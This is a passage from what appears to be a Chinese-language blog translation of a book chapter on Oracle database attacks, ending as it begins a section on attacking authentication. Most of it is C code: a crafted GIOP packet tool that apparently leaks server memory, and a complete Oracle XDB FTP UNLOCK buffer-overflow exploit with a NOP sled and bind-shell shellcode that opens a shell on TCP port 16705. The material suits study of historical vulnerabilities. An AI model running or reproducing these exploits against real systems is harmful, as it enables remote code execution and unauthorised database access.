class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winsock.h&gt;</span><br><span class="line"></span><br><span class="line">int SendGIOPPacket(void);</span><br><span class="line">int StartWinsock(void);</span><br><span class="line">int packet_length(char *);</span><br><span class="line">int PrintResponse(unsigned char *p, int 1);</span><br><span class="line">int bswap_i(unsigned int);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct sockaddr_in s_sa;</span><br><span class="line">struct hostent *he;</span><br><span class="line">unsigned int addr;</span><br><span class="line">int IIOPPort=2481;</span><br><span class="line">char host[260]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">int PKT_LEN = 148;</span><br><span class="line"></span><br><span class="line">unsigned char GIOPPacketHeader[2000]=</span><br><span class="line">&quot;\x47\x49\x4f\x50&quot;      // MAGIC</span><br><span class="line">&quot;\x01\x00&quot;            // VERSION</span><br><span class="line">&quot;\x00&quot;                  // BYTE ORDER</span><br><span class="line">&quot;\x00&quot;                  // MSG_TYPE</span><br><span class="line">&quot;\x00\x00\x00\x82&quot;      // MSG_SIZE</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\xFF\xFF&quot;;      // SIZE</span><br><span class="line"></span><br><span class="line">unsigned char GIOPPacketTail[]=</span><br><span class="line">&quot;\x00&quot;</span><br><span class="line">&quot;\x49\x4e\x49\x54&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x04&quot;</span><br><span class="line">&quot;\x67\x65\x74\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x0c&quot;</span><br><span class="line">&quot;\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65\x00&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      unsigned int ErrorLevel=0, bytes = 0;</span><br><span class="line">      unsigned short len=0;</span><br><span class="line">      int count = 0;</span><br><span class="line">      unsigned char sid[100]=&quot;&quot;;</span><br><span class="line">      unsigned char buffer[512]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      if(argc !=4)</span><br><span class="line">            return printf(&quot;%s HOST SID BYTES\n&quot;,argv[0]);</span><br><span class="line"></span><br><span class="line">      strncpy(host,argv[1],256);</span><br><span class="line">      strncpy(sid,argv[2],96);</span><br><span class="line">      bytes = atoi(argv[3]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_snprintf(buffer,508,&quot;ORCL(CONNECT_DATA=(REP_ID=IDL:CORBA/InitialReferen</span><br><span class="line">ces:1.0)(SID=%s)(SESSION_ID=0))&quot;,sid);</span><br><span class="line"></span><br><span class="line">      len = (unsigned short)strlen(sid)+0x82;</span><br><span class="line">      PKT_LEN = len + 0xC;</span><br><span class="line"></span><br><span class="line">      bytes = bswap_i(bytes);</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[24],&amp;bytes,4);</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[28],buffer,strlen(buffer));</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[28+strlen(buffer)],GIOPPacketTail,35);</span><br><span class="line"></span><br><span class="line">      GIOPPacketHeader[11]=(unsigned char)len;</span><br><span class="line">      len = len &lt;&lt; 8;</span><br><span class="line">      GIOPPacketHeader[10]=(unsigned char)len;</span><br><span class="line"></span><br><span class="line">      if(StartWinsock()==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Error starting Winsock.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      SendGIOPPacket();</span><br><span class="line"></span><br><span class="line">      return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int bswap_i(unsigned int v)</span><br><span class="line">&#123;</span><br><span class="line">      __asm &#123;</span><br><span class="line">            xor eax, eax</span><br><span class="line">            mov eax,v</span><br><span class="line">            bswap eax</span><br><span class="line">            mov v, eax</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      return v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int StartWinsock()</span><br><span class="line">&#123;</span><br><span class="line">      int err=0;</span><br><span class="line">      WORD wVersionRequested;</span><br><span class="line">      WSADATA wsaData;</span><br><span class="line"></span><br><span class="line">      wVersionRequested = MAKEWORD( 2, 0 );</span><br><span class="line">      err = WSAStartup(wVersionRequested, &amp;wsaData );</span><br><span class="line">      if ( err != 0 )</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE(wsaData.wVersion )</span><br><span class="line">!= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">            WSACleanup( );</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (isalpha(host[0]))</span><br><span class="line">            he = gethostbyname(host);</span><br><span class="line"></span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            addr = inet_addr(host);</span><br><span class="line">            he = gethostbyaddr((char *)&amp;addr,4,AF_INET);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (he == NULL)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      s_sa.sin_addr.s_addr=INADDR_ANY;</span><br><span class="line">      s_sa.sin_family=AF_INET;</span><br><span class="line">      memcpy(&amp;s_sa.sin_addr,he-&gt;h_addr,he-&gt;h_length);</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int SendGIOPPacket(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      SOCKET c_sock;</span><br><span class="line"></span><br><span class="line">      unsigned char resp[10000]=&quot;&quot;;</span><br><span class="line">      int snd=0,rcv=0,count=0, var=0;</span><br><span class="line">      unsigned int ttlbytes=0;</span><br><span class="line">      unsigned int to=2000;</span><br><span class="line">      struct sockaddr_in        srv_addr,cli_addr;</span><br><span class="line">      SOCKET            cli_sock;</span><br><span class="line">      unsigned int size = 0;</span><br><span class="line">      char *buf = NULL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      cli_sock=socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">      if (cli_sock==INVALID_SOCKET)</span><br><span class="line">            return printf(&quot;sock error&quot;);</span><br><span class="line"></span><br><span class="line">      s_sa.sin_port=htons((unsigned short)IIOPPort);</span><br><span class="line"></span><br><span class="line">      if</span><br><span class="line">(connect(cli_sock,(LPSOCKADDR)&amp;s_sa,sizeof(s_sa))==SOCKET_ERROR)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Connect error %d&quot;,GetLastError());</span><br><span class="line">            return closesocket(cli_sock);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      buf = malloc(264);</span><br><span class="line">      if(!buf)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;malloc failed.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      memset(buf,0,264);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      snd=send(cli_sock, GIOPPacketHeader , PKT_LEN , 0);</span><br><span class="line">      while(rcv !=SOCKET_ERROR)</span><br><span class="line">      &#123;</span><br><span class="line">            rcv = recv(cli_sock,resp,260,0);</span><br><span class="line">            if(rcv == 0||rcv ==SOCKET_ERROR)</span><br><span class="line">                  break;</span><br><span class="line"></span><br><span class="line">            memmove(&amp;buf[size],resp,rcv);</span><br><span class="line">            size = size + rcv;</span><br><span class="line">            buf = realloc(buf,size+260);</span><br><span class="line">            if(!buf)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;realloc failed.\n&quot;);</span><br><span class="line">                  closesocket(cli_sock);</span><br><span class="line">                  return 0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      PrintResponse(buf,size);</span><br><span class="line">      closesocket(cli_sock);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int PrintResponse(unsigned char *ptr,int size)</span><br><span class="line">&#123;</span><br><span class="line">      int count = 0;</span><br><span class="line">      int chk = 0;</span><br><span class="line">      int sp = 0;</span><br><span class="line">      printf(&quot;%.4X   &quot;,count);</span><br><span class="line">      while(count &lt; size)</span><br><span class="line">      &#123;</span><br><span class="line">            if(count % 16 == 0 &amp;&amp; count &gt; 0)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;   &quot;);</span><br><span class="line">                  chk = count;</span><br><span class="line">                  count = count - 16;</span><br><span class="line">                  while(count &lt; chk)</span><br><span class="line">                  &#123;</span><br><span class="line">                        if(ptr[count]&lt;0x20)</span><br><span class="line">                              printf(&quot;.&quot;);</span><br><span class="line">                        else</span><br><span class="line">                              printf(&quot;%c&quot;,ptr[count]);</span><br><span class="line">                        count ++;</span><br><span class="line">                  &#125;</span><br><span class="line">                  printf(&quot;\n%.4X   &quot;,count);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%.2X &quot;,ptr[count]);</span><br><span class="line">            count ++;</span><br><span class="line">      &#125;</span><br><span class="line">      count = count - chk;</span><br><span class="line">      count = 17 - count;</span><br><span class="line">      while(sp &lt; count)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;    &quot;);</span><br><span class="line">            sp++;</span><br><span class="line">      &#125;</span><br><span class="line">      count = chk;</span><br><span class="line">      while(count &lt; size)</span><br><span class="line">      &#123;</span><br><span class="line">            if(ptr[count]&lt;0x20)</span><br><span class="line">                  printf(&quot;.&quot;);</span><br><span class="line">            else</span><br><span class="line">                  printf(&quot;%c&quot;,ptr[count]);</span><br><span class="line">            count ++;</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;\n\n\n\n&quot;);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="XML数据库"><a href="#XML数据库" class="headerlink" title="XML数据库"></a>XML数据库</h3><p>​        XML数据库（也称为XDB）提供两种服务：一种在TCP端口8080上通过HTTP提供服务，另一种在TCP端口2100上基于FTP的服务。过去，XDB遭受了许多缓冲区溢出漏洞的困扰，包括身份验证机制中的溢出（用户名或密码过长）。 以下代码利用了在Linux上运行的XDB 9.2.0.1上的UNLOCK溢出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;netdb.h&gt;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      struct hostent *he;</span><br><span class="line">      struct sockaddr_in sa;</span><br><span class="line">      int sock;</span><br><span class="line">      unsigned int addr = 0;</span><br><span class="line">      char recvbuffer[512]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      char user[260]=&quot;user &quot;;</span><br><span class="line">      char passwd[260]=&quot;pass &quot;;</span><br><span class="line">      int rcv=0;</span><br><span class="line">      int snd =0;</span><br><span class="line">      int count = 0;</span><br><span class="line">      unsigned char nop_sled[1804]=&quot;&quot;;</span><br><span class="line">      unsigned char saved_return_address[]=&quot;\x41\xc8\xff\xbf&quot;;</span><br><span class="line">      unsigned char exploit[2100]=&quot; unlock / AAAABBB&quot;</span><br><span class="line">      &quot;BCCCCDDDDEEEEFFF&quot;</span><br><span class="line">      &quot;FGGGGHHHHIIIIJJJ&quot;</span><br><span class="line">      &quot;JKKKKLLLLMMMMNNN&quot;</span><br><span class="line">      &quot;NOOOOPPPPQQQQRRR&quot;</span><br><span class="line">      &quot;RSSSSTTTTUUUUVVV&quot;</span><br><span class="line">      &quot;VWWWWXXXXYYYYZZZ&quot;</span><br><span class="line">      &quot;Zaaaabbbbccccdd&quot;;</span><br><span class="line"></span><br><span class="line">      unsigned char</span><br><span class="line">code[]=&quot;\x31\xdb\x53\x43\x53\x43\x53\x4b\x6a\x66\x58\x54\x59\xcd&quot;</span><br><span class="line">      &quot;\x80\x50\x4b\x53\x53\x53\x66\x68\x41\x41\x43\x43\x66\x53&quot;</span><br><span class="line">      &quot;\x54\x59\x6a\x10\x51\x50\x54\x59\x6a\x66\x58\xcd\x80\x58&quot;</span><br><span class="line">      &quot;\x6a\x05\x50\x54\x59\x6a\x66\x58\x43\x43\xcd\x80\x58\x83&quot;</span><br><span class="line">      &quot;\xec\x10\x54\x5a\x54\x52\x50\x54\x59\x6a\x66\x58\x43\xcd&quot;</span><br><span class="line">      &quot;\x80\x50\x31\xc9\x5b\x6a\x3f\x58\xcd\x80\x41\x6a\x3f\x58&quot;</span><br><span class="line">      &quot;\xcd\x80\x41\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x99\x52\x68&quot;</span><br><span class="line">      &quot;\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54&quot;</span><br><span class="line">      &quot;\x59\xcd\x80\r\n&quot;;</span><br><span class="line">      if(argc !=4)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;\n\n\tOracle XDB FTP Service UNLOCK Buffer Overflow</span><br><span class="line">Exploit&quot;);</span><br><span class="line">            printf(&quot;\n\t\tfor Blackhat (http://www.blackhat.com)&quot;);</span><br><span class="line">            printf(&quot;\n\n\tSpawns a shell listening on TCP Port 16705&quot;);</span><br><span class="line">            printf(&quot;\n\n\tUsage:\t%s host userid password&quot;,argv[0]);</span><br><span class="line">            printf(&quot;\n\n\tDavid Litchfield\n\t(david@ngssoftware.com)&quot;);</span><br><span class="line">            printf(&quot;\n\t7th July 2003\n\n\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while(count &lt; 1800)</span><br><span class="line">            nop_sled[count++]=0x90;</span><br><span class="line"></span><br><span class="line">      // Build the exploit</span><br><span class="line">      strcat(exploit,saved_return_address);</span><br><span class="line">      strcat(exploit,nop_sled);</span><br><span class="line">      strcat(exploit,code);</span><br><span class="line"></span><br><span class="line">      // Process arguments</span><br><span class="line">      strncat(user,argv[2],240);</span><br><span class="line">      strncat(passwd,argv[3],240);</span><br><span class="line">      strcat(user,&quot;\r\n&quot;);</span><br><span class="line">      strcat(passwd,&quot;\r\n&quot;);</span><br><span class="line"></span><br><span class="line">      // Setup socket stuff</span><br><span class="line">      sa.sin_addr.s_addr=INADDR_ANY;</span><br><span class="line">      sa.sin_family = AF_INET;</span><br><span class="line">      sa.sin_port = htons((unsigned short) 2100);</span><br><span class="line"></span><br><span class="line">      // Resolve the target system</span><br><span class="line">      if(isalpha(argv[1][0])==0)</span><br><span class="line">      &#123;</span><br><span class="line">            addr = inet_addr(argv[1]);</span><br><span class="line">            memcpy(&amp;sa.sin_addr,&amp;addr,4);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            he = gethostbyname(argv[1]);</span><br><span class="line">            if(he == NULL)</span><br><span class="line">                  return printf(&quot;Couldn&#x27;t resolve host %s\n&quot;,argv[1]);</span><br><span class="line">            memcpy(&amp;sa.sin_addr,he-&gt;h_addr,he-&gt;h_length);</span><br><span class="line">      &#125;</span><br><span class="line">      sock = socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">      if(sock &lt; 0)</span><br><span class="line">            return printf(&quot;socket() failed.\n&quot;);</span><br><span class="line">      if(connect(sock,(struct sockaddr *) &amp;sa,sizeof(sa)) &lt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">                  return printf(&quot;connect() failed.\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;\nConnected to %s....\n&quot;,argv[1]);</span><br><span class="line"></span><br><span class="line">      // Receive and print banner</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">            bzero(recvbuffer,rcv+1);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // send user command</span><br><span class="line">      snd = send(sock,user,strlen(user),0);</span><br><span class="line">      if(snd != strlen(user))</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">            printf(&quot;%s&quot;,user);</span><br><span class="line">      &#125;</span><br><span class="line">      // Receive response. Response code should be 331</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            if(recvbuffer[0]==0x33 &amp;&amp; recvbuffer[1]==0x33 &amp;&amp;</span><br><span class="line">recvbuffer[2]==0x31)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">                  bzero(recvbuffer,rcv+1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                  close(sock);</span><br><span class="line">                  return printf(&quot;FTP response code was not 331.\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Send pass command</span><br><span class="line">      snd = send(sock,passwd,strlen(passwd),0);</span><br><span class="line">      if(snd != strlen(user))</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">            printf(&quot;%s&quot;,passwd);</span><br><span class="line"></span><br><span class="line">      // Receive reponse. If not 230 login has failed.</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            if(recvbuffer[0]==0x32 &amp;&amp; recvbuffer[1]==0x33 &amp;&amp;</span><br><span class="line">recvbuffer[2]==0x30)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">                  bzero(recvbuffer,rcv+1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                  close(sock);</span><br><span class="line">                  return printf(&quot;FTP response code was not 230. Login</span><br><span class="line">failed...\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">          close(sock);</span><br><span class="line">          return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     // Send the UNLOCK command with exploit</span><br><span class="line">     snd = send(sock,exploit,strlen(exploit),0);</span><br><span class="line">     if(snd != strlen(exploit))</span><br><span class="line">     &#123;</span><br><span class="line">          close(sock);</span><br><span class="line">          return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     // Should receive a 550 error response.</span><br><span class="line">     rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">     if(rcv &gt; 0)</span><br><span class="line">     printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">     printf(&quot;\n\nExploit code sent....\n\nNow telnet to %s</span><br><span class="line">16705\n\n&quot;,argv[1]);</span><br><span class="line">     close(sock);</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="攻击身份验证过程"><a href="#攻击身份验证过程" class="headerlink" title="攻击身份验证过程"></a>攻击身份验证过程</h2><p>​        获得对数据库及其数据的完全访问权限是大多数攻击者的最终选择，但仅获得任何访问权限就是第一步。 对于尚未拥有用户ID或密码的用户，必须首先绕过身份验证过程。 这样做既可以像利用缓冲区溢出一样技术，也可以像进行蛮力攻击一样简单，也可以简单地获取用户ID和密码。 本章涉及通过攻击身份验证过程来访问数据库服务器本身。</p>
<h3 id="如何进行身份验证"><a href="#如何进行身份验证" class="headerlink" title="如何进行身份验证"></a>如何进行身份验证</h3><p>​        尝试登录数据库时，客户端首先连接到TNS侦听器并请求访问数据库服务。 以下代码显示了示例连接的数据包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 320</span><br><span class="line">      Identifier: 9373</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line"></span><br><span class="line">      Checksum: 0x532d</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.37</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1916</span><br><span class="line">      Dest port: 1521</span><br><span class="line">      Sequence: 2802498112</span><br><span class="line">      ack: 2168229595</span><br><span 